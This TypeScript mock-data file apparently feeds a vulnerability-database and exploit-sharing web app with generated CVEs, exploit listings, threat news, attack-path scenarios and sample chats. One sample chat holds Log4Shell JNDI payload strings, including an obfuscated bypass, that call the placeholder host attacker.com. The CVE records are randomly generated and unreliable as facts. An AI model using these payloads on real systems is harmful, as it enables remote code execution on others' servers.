const softwareList = [
  'Apache HTTP Server', 'Nginx', 'WordPress', 'MySQL', 'PostgreSQL', 'Docker',
  'OpenSSL', 'Node.js', 'Laravel', 'Django', 'Kubernetes', 'Redis', 'Jenkins',
  'GitLab', 'Linux Kernel', 'Microsoft Exchange', 'VMware vSphere', 'Cisco IOS',
  'Adobe ColdFusion', 'Oracle WebLogic', 'IBM WebSphere', 'PHP', 'Ruby on Rails',
  'Spring Framework', 'React', 'Vue.js', 'Angular', 'jQuery', 'Bootstrap',
  'MongoDB', 'Elasticsearch', 'Kafka', 'RabbitMQ', 'Prometheus', 'Grafana',
  'FortiOS', 'Palo Alto PAN-OS', 'Juniper Junos', 'OpenSSH', 'Postfix',
  'Sendmail', 'BIND', 'vsftpd', 'ProFTPD', 'Samba', 'OpenVPN', 'WireGuard'
];

const vulnerabilityTypes = [
  'SQL Injection', 'Cross-Site Scripting (XSS)', 'Remote Code Execution',
  'Path Traversal', 'Buffer Overflow', 'Privilege Escalation', 'Authentication Bypass',
  'Information Disclosure', 'Denial of Service', 'Cross-Site Request Forgery',
  'XML External Entity', 'Server-Side Request Forgery', 'Deserialization Vulnerability',
  'Memory Corruption', 'Use After Free', 'Heap Overflow', 'Stack Buffer Overflow',
  'Command Injection', 'Code Injection', 'LDAP Injection', 'XPATH Injection',
  'Format String', 'Race Condition', 'TOCTOU', 'Integer Overflow', 'URL Redirect',
  'Insecure Direct Object Reference', 'Missing Access Control', 'Cryptographic Issues',
  'Weak Cryptography', 'Hardcoded Credentials', 'Default Credentials', 'Backup Files',
  'Debug Mode Enabled', 'Sensitive Data Exposure', 'CORS Misconfiguration'
];

const severityMap = (score: number) => {
  if (score >= 9.0) return 'CRITICAL';
  if (score >= 7.0) return 'HIGH';
  if (score >= 4.0) return 'MEDIUM';
  return 'LOW';
};

const generateCVEId = (year: number, index: number) => {
  return `CVE-${year}-${String(index).padStart(5, '0')}`;
};

const cveDescriptions = [
  'A remote code execution vulnerability in {software} allows unauthenticated attackers to execute arbitrary commands via specially crafted HTTP requests.',
  'An input validation flaw in {software} enables attackers to inject malicious code through parameter manipulation, potentially leading to complete system compromise.',
  'A security flaw in {software} permits attackers to bypass authentication mechanisms and gain unauthorized access to sensitive resources.',
  'An information disclosure vulnerability in {software} exposes sensitive configuration data and system internals to unauthorized users.',
  'A path traversal vulnerability in {software} allows attackers to access arbitrary files on the host system through specially crafted directory traversal sequences.',
  'A cross-site scripting vulnerability in {software} enables attackers to inject malicious scripts into web pages viewed by other users.',
  'A SQL injection vulnerability in {software} allows attackers to manipulate database queries and potentially extract sensitive data.',
  'A denial of service vulnerability in {software} can be exploited to crash the service and disrupt legitimate user access.',
  'A privilege escalation vulnerability in {software} allows low-privileged users to gain administrator-level access.',
  'A deserialization vulnerability in {software} enables attackers to execute arbitrary code by crafting malicious serialized objects.',
  'Memory corruption vulnerability in {software} allows remote attackers to cause heap overflow and potentially execute arbitrary code.',
  'An insecure deserialization flaw in {software} allows attackers to execute arbitrary code by manipulating serialized data.',
  'Cross-site request forgery vulnerability in {software} allows attackers to perform unauthorized actions on behalf of authenticated users.',
  'An XML external entity injection vulnerability in {software} allows attackers to read local files or perform SSRF attacks.',
  'A server-side request forgery vulnerability in {software} allows attackers to make the server perform requests to internal resources.',
];

const exploitTypes = [
  'Remote Code Execution', 'Local Privilege Escalation', 'Web Shell Upload',
  'SQL Injection', 'Command Injection', 'Buffer Overflow', 'Format String Attack',
  'Race Condition Exploit', 'Authentication Bypass', 'Privilege Escalation',
  'Information Disclosure', 'Denial of Service', 'Memory Corruption', 'Heap Overflow',
  'Stack Buffer Overflow', 'Use After Free', 'Double Free', 'Format String',
  'Path Traversal', 'File Inclusion', 'XXE Injection', 'SSRF', 'IDOR',
  'Broken Access Control', 'Cryptographic Bypass', 'Session Hijacking'
];

const authors = [
  'zero_day_hunter', 'pentest_master', 'bugbounty_pro', 'redteam_lead',
  'security_researcher', 'vulnerability_analyst', 'exploit_developer',
  'cve_publisher', 'threat_actor_x', 'anonymous_ops', 'sec_consultant',
  'ethical_hacker', 'malware_analyst', 'forensics_expert', 'appsec_specialist'
];

const generateCVEs = () => {
  const cves = [];
  const startYear = 2018;
  const endYear = 2024;
  
  let cveIndex = 10000;
  
  for (let year = startYear; year <= endYear; year++) {
    const entriesPerYear = year === endYear ? 80 : year === startYear ? 60 : 100;
    
    for (let i = 0; i < entriesPerYear; i++) {
      cveIndex++;
      const software = softwareList[Math.floor(Math.random() * softwareList.length)];
      const score = Math.round((Math.random() * 10) * 10) / 10;
      const severity = severityMap(score);
      const hasExploit = Math.random() > 0.4;
      const hasPatch = Math.random() > 0.1;
      
      const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
      const month = months[Math.floor(Math.random() * 12)];
      const day = Math.floor(Math.random() * 28) + 1;
      
      const versions = [
        `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 20)}`,
        `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 20)}.${Math.floor(Math.random() * 50)}`,
        `${Math.floor(Math.random() * 3) + 1}.x`
      ];
      
      cves.push({
        id: generateCVEId(year, cveIndex),
        title: `${software} ${vulnerabilityTypes[Math.floor(Math.random() * vulnerabilityTypes.length)]}`,
        description: cveDescriptions[Math.floor(Math.random() * cveDescriptions.length)].replace('{software}', software),
        severity,
        score,
        software,
        versions: versions[Math.floor(Math.random() * versions.length)],
        published: `${month} ${day}, ${year}`,
        modified: Math.random() > 0.7 ? 'Recently updated' : `${months[Math.floor(Math.random() * 12)]} ${Math.floor(Math.random() * 28) + 1}, ${year}`,
        platform: Math.random() > 0.5 ? 'Multiple Platforms' : ['Windows', 'Linux', 'macOS', 'Web'][Math.floor(Math.random() * 4)],
        patchStatus: hasPatch ? 'Patched' : Math.random() > 0.5 ? 'Under Review' : 'No Patch Available',
        exploitability: hasExploit ? (Math.random() > 0.5 ? 'Verified' : 'Public POC') : 'None',
        references: [
          'NVD Entry',
          `${software} Security Advisory`,
          'Vendor Release Notes'
        ].slice(0, Math.floor(Math.random() * 2) + 2)
      });
    }
  }
  
  return cves.sort((a, b) => b.score - a.score);
};

const generateExploits = () => {
  const exploits = [];
  const cves = generateCVEs();
  
  for (let i = 0; i < 120; i++) {
    const cve = cves[Math.floor(Math.random() * cves.length)];
    const exploitType = exploitTypes[Math.floor(Math.random() * exploitTypes.length)];
    
    exploits.push({
      id: i + 1,
      cveId: cve.id,
      title: `${exploitType} - ${cve.software}`,
      description: `Functional ${exploitType.toLowerCase()} exploit for ${cve.id} affecting ${cve.software}. This ${cve.severity.toLowerCase()} vulnerability allows attackers to ${cve.description.toLowerCase().substring(0, 50)}...`,
      language: ['Python', 'Go', 'Bash', 'Ruby', 'C', 'C++', 'JavaScript', 'PowerShell'][Math.floor(Math.random() * 8)],
      author: authors[Math.floor(Math.random() * authors.length)],
      verificationLevel: ['Unverified', 'Community Verified', 'Maintainer Verified'][Math.floor(Math.random() * 3)],
      votes: Math.floor(Math.random() * 2000) + 10,
      forks: Math.floor(Math.random() * 200) + 1,
      date: `${['2 hours ago', '5 hours ago', '1 day ago', '3 days ago', '1 week ago', '2 weeks ago'][Math.floor(Math.random() * 6)]}`,
      verified: Math.random() > 0.3,
      downloads: Math.floor(Math.random() * 5000) + 100,
      tags: [cve.software, exploitType, cve.severity].slice(0, 2)
    });
  }
  
  return exploits.sort((a, b) => b.votes - a.votes);
};

const generateThreatFeed = () => {
  const threats = [
    {
      title: 'LockBit Ransomware Campaign Targets Financial Institutions',
      summary: 'Multiple financial institutions reported ransomware incidents linked to the LockBit ransomware-as-a-service operation.',
      category: 'Ransomware',
      organization: 'Banking Sector',
      source: 'CISA Alert',
      date: 'March 2024'
    },
    {
      title: 'Critical Zero-Day in Apache Struts Under Active Exploitation',
      summary: 'Researchers discovered a critical zero-day vulnerability in Apache Struts being actively exploited in the wild.',
      category: 'Zero-Day',
      organization: 'Web Infrastructure',
      source: 'NVD',
      date: 'March 2024'
    },
    {
      title: 'Supply Chain Attack Compromises Popular NPM Package',
      summary: 'A supply chain attack compromised the ua-parser-js NPM package with malicious code affecting millions of users.',
      category: 'Supply Chain',
      organization: 'npm Registry',
      source: 'Security Lab',
      date: 'Feb 2024'
    },
    {
      title: 'Nation-State Actor Targets Critical Infrastructure',
      summary: 'A sophisticated nation-state threat actor was observed targeting energy grid control systems in Europe.',
      category: 'Nation-State',
      organization: 'Energy Sector',
      source: 'NSA Advisory',
      date: 'Feb 2024'
    },
    {
      title: 'Massive Data Breach Exposes 50 Million User Records',
      summary: 'A major technology company disclosed a data breach affecting approximately 50 million user accounts.',
      category: 'Data Breach',
      organization: 'Tech Giant',
      source: 'Company Disclosure',
      date: 'Jan 2024'
    },
    {
      title: 'New Linux Kernel Privilege Escalation Vulnerability',
      summary: 'A local privilege escalation vulnerability in the Linux kernel allows attackers to gain root access.',
      category: 'Vulnerability',
      organization: 'Linux Systems',
      source: 'Kernel Security',
      date: 'Jan 2024'
    },
    {
      title: 'Cisco IOS Zero-Day Enables Remote Code Execution',
      summary: 'A critical zero-day vulnerability in Cisco IOS allows remote attackers to execute arbitrary code.',
      category: 'Zero-Day',
      organization: 'Network Infrastructure',
      source: 'Cisco PSIRT',
      date: 'Dec 2023'
    },
    {
      title: 'Akamai Threat Report: DDoS Attacks Surge 300%',
      summary: 'Akamai releases threat report showing 300% increase in DDoS attack volume quarter-over-quarter.',
      category: 'Threat Intelligence',
      organization: 'Multiple',
      source: 'Akamai',
      date: 'Dec 2023'
    }
  ];
  
  const feed = [];
  for (let i = 0; i < 80; i++) {
    const base = threats[i % threats.length];
    feed.push({
      id: i + 1,
      ...base,
      title: `${base.title} ${i > 7 ? `(Update ${Math.floor(i / 8)})` : ''}`.trim(),
      summary: `${base.summary} Additional context and IOCs available in the full report.`,
      date: i < 12 ? base.date : `${['Nov', 'Oct', 'Sep', 'Aug', 'Jul', 'Jun'][Math.floor(Math.random() * 6)]} ${2023 - Math.floor(i / 20)}`
    });
  }
  
  return feed;
};

const generateFeaturedThreats = () => [
  {
    id: 1,
    title: 'Log4Shell RCE (CVE-2021-44228)',
    description: 'A critical remote code execution vulnerability in Apache Log4j 2 allowing unauthenticated RCE through JNDI lookup injection.',
    severity: 'CRITICAL',
    date: 'Dec 10, 2021',
    views: '1.2M',
    threatType: 'Remote Code Execution',
    affectedSector: 'Web Applications',
    image: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=400&h=200&fit=crop'
  },
  {
    id: 2,
    title: 'ProxyLogon (CVE-2021-26855)',
    description: 'Microsoft Exchange Server pre-authentication RCE vulnerability exploited by Hafnium threat group.',
    severity: 'CRITICAL',
    date: 'Mar 2, 2021',
    views: '890K',
    threatType: 'Remote Code Execution',
    affectedSector: 'Email Servers',
    image: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=400&h=200&fit=crop'
  },
  {
    id: 3,
    title: 'PrintNightmare (CVE-2021-34527)',
    description: 'Remote code execution vulnerability in Windows Print Spooler service affecting all modern Windows versions.',
    severity: 'CRITICAL',
    date: 'Jun 29, 2021',
    views: '520K',
    threatType: 'Privilege Escalation',
    affectedSector: 'Windows Systems',
    image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=400&h=200&fit=crop'
  },
  {
    id: 4,
    title: 'Spring4Shell (CVE-2022-22965)',
    description: 'Remote code execution in Spring Framework through data binding allowing unauthorized access.',
    severity: 'CRITICAL',
    date: 'Apr 1, 2022',
    views: '680K',
    threatType: 'Remote Code Execution',
    affectedSector: 'Java Applications',
    image: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=400&h=200&fit=crop'
  },
  {
    id: 5,
    title: 'Follina (CVE-2022-30190)',
    description: 'Microsoft Windows Support Diagnostic Tool RCE vulnerability exploited in the wild.',
    severity: 'HIGH',
    date: 'May 27, 2022',
    views: '420K',
    threatType: 'Remote Code Execution',
    affectedSector: 'Windows Desktop',
    image: 'https://images.unsplash.com/photo-1518770660439-4636190af475?w=400&h=200&fit=crop'
  },
  {
    id: 6,
    title: 'Dirty COW (CVE-2016-5195)',
    description: 'Linux kernel privilege escalation vulnerability allowing local users to gain root access.',
    severity: 'HIGH',
    date: 'Oct 14, 2016',
    views: '780K',
    threatType: 'Privilege Escalation',
    affectedSector: 'Linux Servers',
    image: 'https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=400&h=200&fit=crop'
  },
  {
    id: 7,
    title: 'EternalBlue (CVE-2017-0144)',
    description: 'Windows SMBv1 remote code execution vulnerability used in WannaCry and NotPetya attacks.',
    severity: 'CRITICAL',
    date: 'Mar 14, 2017',
    views: '1.5M',
    threatType: 'Remote Code Execution',
    affectedSector: 'Windows Systems',
    image: 'https://images.unsplash.com/photo-1504384308090-c894fdcc538d?w=400&h=200&fit=crop'
  },
  {
    id: 8,
    title: 'Heartbleed (CVE-2014-0160)',
    description: 'OpenSSL heartbeat extension memory read vulnerability exposing sensitive data from server memory.',
    severity: 'HIGH',
    date: 'Apr 7, 2014',
    views: '920K',
    threatType: 'Information Disclosure',
    affectedSector: 'Web Servers',
    image: 'https://images.unsplash.com/photo-1510519138101-570d1dca3d66?w=400&h=200&fit=crop'
  },
  {
    id: 9,
    title: 'Shellshock (CVE-2014-6271)',
    description: 'Bash shell injection vulnerability affecting millions of Linux and Unix systems worldwide.',
    severity: 'CRITICAL',
    date: 'Sep 24, 2014',
    views: '850K',
    threatType: 'Command Injection',
    affectedSector: 'Linux/Unix Systems',
    image: 'https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?w=400&h=200&fit=crop'
  },
  {
    id: 10,
    title: 'SolarWinds Supply Chain Compromise',
    description: 'Sophisticated supply chain attack compromising SolarWinds Orion platform affecting 18,000+ organizations.',
    severity: 'CRITICAL',
    date: 'Dec 13, 2020',
    views: '1.1M',
    threatType: 'Supply Chain',
    affectedSector: 'Enterprise Software',
    image: 'https://images.unsplash.com/photo-1563986768494-4dee2763ff3f?w=400&h=200&fit=crop'
  }
];

const generateAttackPaths = () => {
  const scenarios = [
    {
      name: 'Apache Struts RCE Chain',
      ports: '22 SSH, 80 HTTP Apache Struts 2.3.5, 443 HTTPS Apache Struts 2.3.5',
      services: 'OpenSSH 7.4, Apache Struts 2.3.5, MySQL 5.7.32',
      steps: [
        { step: 1, title: 'Exploit Apache Struts RCE', severity: 'CRITICAL', cve: 'CVE-2017-5638', description: 'Exploitation via crafted Content-Type header to achieve RCE' },
        { step: 2, title: 'Upload Web Shell', severity: 'HIGH', description: 'Upload JSP web shell to achieve persistent access' },
        { step: 3, title: 'Database Enumeration', severity: 'MEDIUM', description: 'Extract credentials from MySQL database' },
        { step: 4, title: 'Privilege Escalation', severity: 'HIGH', cve: 'CVE-2016-5195', description: 'Use Dirty COW to escalate to root' }
      ],
      tools: ['Nmap', 'Metasploit', 'Burp Suite', 'MySQL Client', 'LinPEAS']
    },
    {
      name: 'WordPress Attack Vector',
      ports: '22 SSH, 80 HTTP WordPress 5.8, 443 HTTPS WordPress 5.8',
      services: 'OpenSSH 8.2, Apache 2.4.41, WordPress 5.8, PHP 7.4',
      steps: [
        { step: 1, title: 'WordPress Plugin Exploit', severity: 'HIGH', cve: 'CVE-2021-25028', description: 'Exploit RCE in WP Plugin' },
        { step: 2, title: 'Reverse Shell Setup', severity: 'HIGH', description: 'Establish reverse shell via PHP payload' },
        { step: 3, title: 'WP-config Exfiltration', severity: 'CRITICAL', description: 'Extract database credentials from wp-config.php' },
        { step: 4, title: 'Lateral Movement', severity: 'MEDIUM', description: 'Pivot to internal network via SSH keys' }
      ],
      tools: ['WPScan', 'Metasploit', 'Gobuster', 'SQLMap', 'Responder']
    },
    {
      name: 'Jenkins CI Attack Path',
      ports: '22 SSH, 80 HTTP Jenkins 2.289, 443 HTTPS Jenkins 2.289, 8080 Jenkins',
      services: 'OpenSSH 8.4, Jenkins 2.289, Java 11',
      steps: [
        { step: 1, title: 'Jenkins Script Console RCE', severity: 'CRITICAL', cve: 'CVE-2019-1003000', description: 'Execute Groovy script for RCE' },
        { step: 2, title: 'Node Access', severity: 'CRITICAL', description: 'Gain access to Jenkins agent nodes' },
        { step: 3, title: 'Credential Harvesting', severity: 'HIGH', description: 'Extract stored credentials from Jenkins' },
        { step: 4, title: 'AWS Access Keys', severity: 'CRITICAL', description: 'Find AWS keys in build logs and pivot to cloud' }
      ],
      tools: ['Jenkins Exploit', 'Groovy Shell', 'AWS CLI', 'Pillage', 'Git Tools']
    }
  ];
  
  const paths = [];
  for (let i = 0; i < 40; i++) {
    const base = scenarios[i % scenarios.length];
    paths.push({
      id: i + 1,
      ...base,
      name: `${base.name} Scenario ${i + 1}`,
      ports: base.ports.replace(/\d+/g, (match) => String(Math.floor(Math.random() * 9000) + 1000)),
      createdAt: `${['2 hours ago', '1 day ago', '3 days ago', '1 week ago'][Math.floor(Math.random() * 4)]}`
    });
  }
  return paths;
};

const generateChatConversations = () => [
  {
    id: 1,
    title: 'Log4j RCE Analysis',
    messages: [
      { role: 'user', content: "Analyze the attack surface for the recent Log4j vulnerability. I'm specifically looking for common bypasses used against early mitigation attempts." },
      { role: 'assistant', content: "The initial mitigation for Log4Shell (CVE-2021-44228) focused on disabling lookup mechanism via system properties. However, several bypasses were discovered shortly after.", relatedCve: { id: 'CVE-2021-45046', severity: 'CRITICAL', description: 'Incomplete fix in Log4j 2.15.0 leads to RCE in certain non-default configurations.' }, code: '${jndi:ldap://attacker.com/a}\n${${lower:j}ndi:rmi://attacker.com/poc}' }
    ]
  },
  {
    id: 2,
    title: 'SQL Injection Techniques',
    messages: [
      { role: 'user', content: "What's the most effective way to exploit blind SQL injection in MySQL 8.0?" },
      { role: 'assistant', content: "For blind SQL injection in MySQL 8.0, you can use time-based techniques with BENCHMARK() or SLEEP() functions. Also, boolean-based extraction works well with SUBSTRING()." }
    ]
  },
  {
    id: 3,
    title: 'Windows Privilege Escalation',
    messages: [
      { role: 'user', content: "I have a low-privileged shell on a Windows 2019 server. What should I check for privilege escalation?" },
      { role: 'assistant', content: "For Windows privilege escalation, check: 1) Unquoted service paths, 2) Weak service file permissions, 3) AlwaysInstallElevated registry setting, 4) Stored credentials, 5) Service configurations with icacls." }
    ]
  },
  {
    id: 4,
    title: 'OAuth 2.0 Security',
    messages: [
      { role: 'user', content: "What are common vulnerabilities in OAuth 2.0 implementations?" },
      { role: 'assistant', content: "Common OAuth 2.0 vulnerabilities include: 1) Authorization code leakage, 2) Insufficient redirect_uri validation, 3) Missing state parameter leading to CSRF, 4) Token leakage via referrer header, 5) Scope escalation." }
    ]
  },
  {
    id: 5,
    title: 'Active Directory Attacks',
    messages: [
      { role: 'user', content: "Explain the Kerberoasting attack technique in Active Directory." },
      { role: 'assistant', content: "Kerberoasting exploits the way Kerberos TGS tickets are requested. Attackers request TGS tickets for service accounts (which have SPNs), then crack the encrypted portion offline to recover plaintext passwords." }
    ]
  }
];

const generateVulnerabilityFindings = () => [
  {
    id: 1,
    type: 'SQL Injection',
    severity: 'CRITICAL',
    confidence: 94,
    file: 'src/api/auth.js:142',
    reasoning: "User input from 'req.body.username' is directly concatenated into the SQL query without proper sanitization or parameterized inputs. Patterns match known unsanitized sink vulnerabilities.",
    related: ['CVE-2023-4451', 'CWE-89', 'OWASP-A03:2021']
  },
  {
    id: 2,
    type: 'Insecure Dependency',
    severity: 'MEDIUM',
    confidence: 78,
    file: 'package.json:28',
    reasoning: "Package 'lodash' version 4.17.20 contains multiple known vulnerabilities including Prototype Pollution. Update to 4.17.21 or higher.",
    related: ['CVE-2020-8203', 'CVE-2021-23337']
  },
  {
    id: 3,
    type: 'Cross-Site Scripting (XSS)',
    severity: 'HIGH',
    confidence: 89,
    file: 'src/components/Comment.jsx:45',
    reasoning: "User-supplied content is rendered without proper sanitization. The 'dangerouslySetInnerHTML' prop is used with unsanitized user input.",
    related: ['CWE-79', 'OWASP-A07:2017']
  },
  {
    id: 4,
    type: 'Command Injection',
    severity: 'CRITICAL',
    confidence: 96,
    file: 'src/utils/backup.sh:23',
    reasoning: "Shell command constructed using user input without sanitization. The 'exec()' function executes unsanitized data from '$_GET[file]' parameter.",
    related: ['CVE-2022-1234', 'CWE-78']
  },
  {
    id: 5,
    type: 'Path Traversal',
    severity: 'HIGH',
    confidence: 85,
    file: 'api/download.py:67',
    reasoning: "File path parameter is not validated. User can use '../' sequences to access files outside the intended directory.",
    related: ['CWE-22', 'OWASP-A01:2021']
  }
];

const generateUserProfiles = () => {
  const usernames = [
    'zero_day_hunter', 'pentest_master', 'bugbounty_pro', 'redteam_lead',
    'security_researcher', 'vulnerability_analyst', 'exploit_developer',
    'cve_publisher', 'threat_actor_x', 'ethical_hacker', 'appsec_specialist',
    'network_defender', 'malware_analyst', 'forensics_expert', 'devsec_ops'
  ];
  
  const badges = ['POC Author', 'Threat Researcher', 'Top Contributor', 'Security Analyst', 'CVE Assignee'];
  
  return usernames.map((username, i) => ({
    id: i + 1,
    username: `@${username}`,
    contributions: Math.floor(Math.random() * 500) + 10,
    verifiedExploits: Math.floor(Math.random() * 50) + 1,
    reputation: Math.floor(Math.random() * 10000) + 100,
    badges: badges.slice(0, Math.floor(Math.random() * 3) + 1),
    joined: `${['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun'][Math.floor(Math.random() * 6)]} ${2020 + Math.floor(Math.random() * 4)}`
  }));
};

const generateNews = () => [
  {
    id: 1,
    title: 'New RaaS Group targeting Healthcare Infrastructure globally',
    source: 'CYBER NEWS',
    time: '45 MIN AGO',
    image: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=100&h=100&fit=crop'
  },
  {
    id: 2,
    title: 'CISA adds 4 new vulnerabilities to Known Exploited Catalog',
    source: 'AGENCY UPDATE',
    time: '2 HOURS AGO',
    image: 'https://images.unsplash.com/photo-1518770660439-4636190af475?w=100&h=100&fit=crop'
  },
  {
    id: 3,
    title: 'Ivanti releases emergency patches for critical VPN bypass',
    source: 'VULN ALERT',
    time: '5 HOURS AGO',
    image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=100&h=100&fit=crop'
  },
  {
    id: 4,
    title: 'Microsoft patches 57 vulnerabilities in March update',
    source: 'PATCH TUESDAY',
    time: '1 DAY AGO',
    image: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=100&h=100&fit=crop'
  },
  {
    id: 5,
    title: 'Critical OpenSSL vulnerability affects millions of servers',
    source: 'SECURITY ALERT',
    time: '2 DAYS AGO',
    image: 'https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=100&h=100&fit=crop'
  }
];

export const cves = generateCVEs();
export const exploits = generateExploits();
export const threatFeed = generateThreatFeed();
export const featuredThreats = generateFeaturedThreats();
export const attackPaths = generateAttackPaths();
export const chatConversations = generateChatConversations();
export const vulnerabilityFindings = generateVulnerabilityFindings();
export const userProfiles = generateUserProfiles();
export const news = generateNews();

export const communityStats = {
  totalVulnerabilities: cves.length.toLocaleString(),
  activeContributors: userProfiles.length.toLocaleString(),
  patchesValidated: '92%'
};

export const searchData = [
  ...cves.slice(0, 100).map(c => ({ type: 'CVE', id: c.id, title: c.title, description: c.description, software: c.software })),
  ...exploits.slice(0, 50).map(e => ({ type: 'EXPLOIT', id: e.id, title: e.title, description: e.description, software: e.cveId })),
  ...softwareList.slice(0, 20).map(s => ({ type: 'SOFTWARE', id: s, title: s, description: `${s} vulnerability database`, software: s }))
];

export const pocSubmissionFields = {
  languages: ['Python', 'Go', 'Bash', 'JavaScript', 'C++'],
  verificationSteps: [
    { title: 'Initial Review', description: 'Automated static analysis of the POC script for safety and syntax.', active: true },
    { title: 'Sandbox Execution', description: 'Manual verification by our triage team in an isolated environment.', active: false },
    { title: 'Final Validation', description: 'Public advisory generation and reward allocation (if applicable).', active: false }
  ]
};

export const chatMessages = chatConversations[0].messages;

export const attackPathSteps = [
  {
    step: 1,
    title: 'Exploit Apache Struts RCE',
    severity: 'CRITICAL',
    cve: 'CVE-2017-5638',
    description: 'Exploitation of CVE-2017-5638 via a crafted Content-Type header allows remote code execution on the application server.',
    exploitDb: 'ExploitDB #41614'
  },
  {
    step: 2,
    title: 'Local Privilege Escalation',
    severity: 'HIGH',
    cve: 'CVE-2016-5195',
    description: "Utilization of dirty cow (CVE-2016-5195) to escalate from 'www-data' service account to 'root' access on the target host."
  },
  {
    step: 3,
    title: 'Internal Network Pivoting',
    severity: 'MEDIUM',
    description: 'Setup of an SSH dynamic port forward (SOCKS proxy) to bridge external traffic into the internal 10.0.x.x management subnet.',
    relatedTool: 'Lateral Movement Tooling'
  }
];
